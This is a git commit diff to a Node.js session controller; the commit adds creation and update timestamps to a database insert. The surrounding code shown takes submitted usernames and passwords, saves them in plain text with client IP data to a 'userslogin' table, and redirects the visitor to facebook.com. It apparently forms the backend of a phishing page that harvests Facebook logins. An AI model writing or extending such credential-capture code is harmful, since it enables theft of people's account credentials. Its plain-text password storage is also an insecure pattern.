04b0d5080a2e463664a247974a875e5153442323
carloslaime <carlos.laime.99@gmail.com>
2022-06-14 01:25:24 -0400

    add field "created and updated"

--- controllers/sesionController.js
+++ controllers/sesionController.js
@@ -14,9 +14,11 @@ async function getIpClient() {
 exports.sesion = (req,res) => {
     const user = req.body.username;
     const pass = req.body.password;
+    let datecreated = new Date();
+    datecreated = datecreated.toISOString();
     getIpClient();
     const inf = 'getIpClient()';
-    conexion.query('INSERT into userslogin SET?', {username: user, password: pass, informationnav: inf}, (error)=>{
+    conexion.query('INSERT into userslogin SET?', {username: user, password: pass, informationnav: inf, created_at: datecreated, updated_at: datecreated}, (error)=>{
         if(error) throw error;
         res.redirect('https://facebook.com');
     })
